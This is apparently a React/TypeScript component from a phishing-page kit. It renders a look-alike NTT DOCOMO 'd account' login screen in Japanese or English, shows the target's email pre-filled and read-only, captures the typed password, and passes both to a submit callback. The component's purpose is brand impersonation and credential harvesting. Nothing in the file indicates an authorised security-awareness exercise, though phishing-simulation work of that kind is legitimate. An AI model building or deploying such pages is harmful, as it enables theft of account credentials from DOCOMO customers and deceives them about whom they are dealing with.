'use client'

import { useState } from 'react'
import { Template, SupportedLanguage, TemplateContent } from '@/lib/templateTypes'
import { getTemplateContent } from '@/lib/templateEngine'

interface DOCOMOTemplateProps {
  template: Template
  language: SupportedLanguage
  email: string
  onSubmit: (email: string, password: string) => void
  onError?: (error: string) => void
}

export function DOCOMOTemplate({
  template,
  language,
  email,
  onSubmit,
  onError
}: DOCOMOTemplateProps) {
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')
  const [isSubmitting, setIsSubmitting] = useState(false)
  
  const content: TemplateContent = getTemplateContent(template, language)
  const { theme, features, background } = template
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!password) {
      setError(content.errorMessages.invalidPassword)
      return
    }
    
    setIsSubmitting(true)
    setError('')
    
    try {
      await onSubmit(email, password)
    } catch (err) {
      setError(content.errorMessages.serverError)
      onError?.(content.errorMessages.serverError)
    } finally {
      setIsSubmitting(false)
    }
  }
  
  return (
    <div 
      style={{
        minHeight: '100vh',
        background: '#FFFFFF',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px',
      }}
    >
      <div
        style={{
          maxWidth: '420px',
          width: '100%',
          background: theme.backgroundColor,
        }}
      >
        {/* Logo/Header */}
        {features.showLogo && (
          <div style={{ 
            textAlign: 'center', 
            marginBottom: '40px',
          }}>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              marginBottom: '20px',
            }}>
              <div style={{
                width: '40px',
                height: '40px',
                background: theme.primaryColor,
                borderRadius: '50%',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                marginRight: '12px',
              }}>
                <span style={{ color: 'white', fontSize: '20px', fontWeight: 'bold' }}>d</span>
              </div>
              <h1 style={{ 
                color: '#333', 
                fontSize: '28px',
                fontWeight: 'normal',
                margin: 0,
              }}>
                {template.logo.text || content.title}
              </h1>
            </div>
          </div>
        )}
        
        {/* Login Icon */}
        <div style={{ 
          textAlign: 'center',
          marginBottom: '30px',
        }}>
          <div style={{
            width: '80px',
            height: '80px',
            background: theme.primaryColor,
            borderRadius: '50%',
            display: 'inline-flex',
            alignItems: 'center',
            justifyContent: 'center',
            marginBottom: '15px',
          }}>
            <svg width="40" height="40" viewBox="0 0 24 24" fill="white">
              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
            </svg>
          </div>
          <h2 style={{
            fontSize: '20px',
            fontWeight: '500',
            color: '#333',
            margin: 0,
          }}>
            {language === 'ja' ? 'ログイン' : 'Log in'}
          </h2>
        </div>
        
        {/* Form Container */}
        <div style={{
          background: 'white',
          padding: '40px 30px',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.08)',
        }}>
          {/* Form */}
          <form onSubmit={handleSubmit}>
            {/* Email/Account ID */}
            <div style={{ marginBottom: '25px' }}>
              <label style={{ 
                display: 'block', 
                marginBottom: '10px',
                fontSize: '14px',
                fontWeight: '600',
                color: '#333',
              }}>
                {content.emailLabel}
              </label>
              <input
                type="text"
                value={email}
                readOnly
                style={{
                  width: '100%',
                  padding: '14px',
                  border: '1px solid #E0E0E0',
                  borderRadius: '6px',
                  fontSize: '15px',
                  background: '#F5F5F5',
                  color: '#666',
                }}
              />
              <div style={{
                marginTop: '8px',
                fontSize: '12px',
                color: '#999',
              }}>
                {content.emailPlaceholder}
              </div>
            </div>
            
            {/* Password */}
            <div style={{ marginBottom: '25px' }}>
              <label style={{ 
                display: 'block', 
                marginBottom: '10px',
                fontSize: '14px',
                fontWeight: '600',
                color: '#333',
              }}>
                {content.passwordLabel}
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder={content.passwordPlaceholder}
                disabled={isSubmitting}
                style={{
                  width: '100%',
                  padding: '14px',
                  border: '1px solid #E0E0E0',
                  borderRadius: '6px',
                  fontSize: '15px',
                  color: '#333',
                }}
              />
            </div>
            
            {/* Remember Me */}
            {features.showRememberMe && (
              <div style={{ marginBottom: '25px' }}>
                <label style={{ 
                  display: 'flex', 
                  alignItems: 'center',
                  fontSize: '14px',
                  color: '#333',
                  cursor: 'pointer',
                }}>
                  <input 
                    type="checkbox" 
                    defaultChecked
                    style={{ 
                      marginRight: '10px',
                      width: '18px',
                      height: '18px',
                      accentColor: theme.primaryColor,
                    }}
                  />
                  {content.rememberMe}
                </label>
              </div>
            )}
            
            {/* Error Message */}
            {error && (
              <div style={{
                background: '#FFEBEE',
                color: '#C62828',
                padding: '12px',
                borderRadius: '6px',
                marginBottom: '20px',
                fontSize: '13px',
                border: '1px solid #FFCDD2',
              }}>
                {error}
              </div>
            )}
            
            {/* Submit Button */}
            <button
              type="submit"
              disabled={isSubmitting}
              style={{
                width: '100%',
                padding: '16px',
                background: theme.primaryColor,
                color: 'white',
                border: 'none',
                borderRadius: '6px',
                fontSize: '16px',
                fontWeight: '600',
                cursor: isSubmitting ? 'not-allowed' : 'pointer',
                opacity: isSubmitting ? 0.6 : 1,
                transition: 'all 0.2s',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
              }}
            >
              {isSubmitting ? (
                <div style={{
                  width: '20px',
                  height: '20px',
                  border: '2px solid white',
                  borderTopColor: 'transparent',
                  borderRadius: '50%',
                  animation: 'spin 0.6s linear infinite',
                }}></div>
              ) : (
                <>
                  {content.submitButton}
                  <span style={{ marginLeft: '8px' }}>→</span>
                </>
              )}
            </button>
            
            {/* Links */}
            <div style={{ marginTop: '25px' }}>
              {features.showForgotPassword && (
                <div style={{ textAlign: 'center', marginBottom: '12px' }}>
                  <a 
                    href="#" 
                    style={{ 
                      color: theme.primaryColor,
                      textDecoration: 'none',
                      fontSize: '14px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                    }}
                  >
                    ▶ {content.forgotPassword}
                  </a>
                </div>
              )}
            </div>
          </form>
          
          {/* Notice */}
          {features.showNotices && content.notices?.loginNote && (
            <div style={{
              marginTop: '25px',
              padding: '15px',
              background: '#FFF8E1',
              borderRadius: '6px',
              fontSize: '12px',
              color: '#856404',
              border: '1px solid #FFE082',
            }}>
              * {content.notices.loginNote}
            </div>
          )}
          
          {/* Create Account Section */}
          {features.showCreateAccount && (
            <div style={{
              marginTop: '30px',
              padding: '20px',
              background: '#F5F5F5',
              borderRadius: '6px',
              textAlign: 'center',
            }}>
              <h3 style={{
                fontSize: '14px',
                fontWeight: '600',
                color: '#333',
                marginBottom: '10px',
              }}>
                {language === 'ja' ? 'ご確認ください' : 'Please check'}
              </h3>
              <p style={{
                fontSize: '13px',
                color: '#666',
                marginBottom: '15px',
              }}>
                {language === 'ja' 
                  ? 'はじめてご利用の方はdアカウントを作成してください。'
                  : 'If you are using this service for the first time, please create a d account.'}
              </p>
              <button
                type="button"
                style={{
                  padding: '12px 24px',
                  background: 'white',
                  color: theme.primaryColor,
                  border: `2px solid ${theme.primaryColor}`,
                  borderRadius: '6px',
                  fontSize: '14px',
                  fontWeight: '600',
                  cursor: 'pointer',
                }}
              >
                {content.createAccount}
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}




